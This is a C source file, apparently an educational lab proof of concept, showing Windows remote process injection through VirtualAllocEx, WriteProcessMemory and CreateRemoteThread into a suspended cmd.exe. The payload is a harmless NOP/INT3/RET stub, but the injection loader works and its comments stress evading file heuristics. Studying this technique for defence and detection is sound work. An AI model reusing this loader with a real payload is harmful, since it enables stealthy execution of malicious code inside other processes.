/**
 * ==============================================================================
 * Project:      Shield Spectrum :: Windows Process Injection Architecture Lab
 * File:         injector.c
 * Target:       AMD64 (x86_64) / Windows 11 & Windows 10
 * Description:  Educational proof-of-concept demonstrating Win32 inter-process
 *               virtual memory allocation, byte streaming, and execution hijacking.
 * 
 * Research:     https://youtube.com/@shieldspectrum
 * Author:       Shield Spectrum Labs (@ssp2x)
 * License:      MIT License
 * ==============================================================================
 */

#include <windows.h>
#include <stdio.h>

/**
 * Harmless Proof-of-Concept Assembly Payload:
 * -------------------------------------------
 * 0x90, 0x90, 0x90, 0x90 : NOP Sled (No-Operation)
 * 0xCC                   : INT 3 (Trap to Debugger / Software Breakpoint)
 * 0xC3                   : RET   (Procedure Return)
 * 
 * This benign bytecode proves arbitrary in-memory execution inside a remote
 * process context without executing destructive commands or tripping static 
 * file heuristics.
 */
unsigned char shellcode[] = {
    0x90, 0x90, 0x90, 0x90, // NOP sled
    0xCC,                   // INT 3
    0xC3                    // RET
};

int main(int argc, char* argv[]) {
    printf("====================================================================\n");
    printf("   SHIELD SPECTRUM LABS :: WIN32 PROCESS INJECTION DISSECTION       \n");
    printf("====================================================================\n\n");

    // Spawn an isolated target process (cmd.exe) in CREATE_SUSPENDED state
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    char targetCmd[] = "cmd.exe";

    printf("[*] Spawning target process (%s) in SUSPENDED state...\n", targetCmd);
    if (!CreateProcessA(NULL, targetCmd, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[-] Failed to create target process. Error Code: %lu\n", GetLastError());
        return 1;
    }
    printf("    [+] Target Process Created: %s (PID: %lu)\n\n", targetCmd, pi.dwProcessId);

    // -------------------------------------------------------------------------
    // STEP 1: Cross Inter-Process Isolation Boundary via OpenProcess()
    // -------------------------------------------------------------------------
    printf("[+] Step 1: Requesting PROCESS_ALL_ACCESS handle via OpenProcess()...\n");
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId);
    if (!hProcess) {
        printf("[-] OpenProcess failed! Error Code: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 0);
        return 1;
    }
    printf("    [✓] Kernel Handle Acquired: 0x%p\n\n", hProcess);

    // -------------------------------------------------------------------------
    // STEP 2: Allocate Dynamic Virtual Memory Page via VirtualAllocEx()
    // -------------------------------------------------------------------------
    printf("[+] Step 2: Carving dynamic page via VirtualAllocEx()...\n");
    LPVOID pRemoteCode = VirtualAllocEx(
        hProcess, 
        NULL, 
        4096, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE
    );
    if (!pRemoteCode) {
        printf("[-] VirtualAllocEx failed! Error Code: %lu\n", GetLastError());
        CloseHandle(hProcess);
        TerminateProcess(pi.hProcess, 0);
        return 1;
    }
    printf("    [✓] Allocated Remote Base: 0x%p [Permission: PAGE_EXECUTE_READWRITE]\n\n", pRemoteCode);

    // -------------------------------------------------------------------------
    // STEP 3: Stream Raw Machine Instructions via WriteProcessMemory()
    // -------------------------------------------------------------------------
    printf("[+] Step 3: Streaming shellcode bytes via WriteProcessMemory()...\n");
    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(hProcess, pRemoteCode, shellcode, sizeof(shellcode), &bytesWritten)) {
        printf("[-] WriteProcessMemory failed! Error Code: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        TerminateProcess(pi.hProcess, 0);
        return 1;
    }
    printf("    [✓] Successfully written %llu bytes into remote RAM (Zero Disk Footprint)!\n\n", bytesWritten);

    // -------------------------------------------------------------------------
    // STEP 4: Hijack Execution Flow via CreateRemoteThread()
    // -------------------------------------------------------------------------
    printf("[+] Step 4: Spawning execution context via CreateRemoteThread()...\n");
    HANDLE hThread = CreateRemoteThread(
        hProcess, 
        NULL, 
        0, 
        (LPTHREAD_START_ROUTINE)pRemoteCode, 
        NULL, 
        0, 
        NULL
    );
    if (!hThread) {
        printf("[-] CreateRemoteThread failed! Error Code: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        TerminateProcess(pi.hProcess, 0);
        return 1;
    }
    printf("    [✓] Remote Worker Thread Active! Handle: 0x%p\n", hThread);
    printf("    [✓] Target RIP pointer hijacked to remote buffer: 0x%p\n\n", pRemoteCode);

    printf("====================================================================\n");
    printf("[#] In-Memory Injection Complete! Inspect memory using System Informer.\n");
    printf("[#] Press ENTER to close kernel handles and terminate target...\n");
    printf("====================================================================\n");
    getchar();

    // Clean up handles
    CloseHandle(hThread);
    CloseHandle(hProcess);
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}
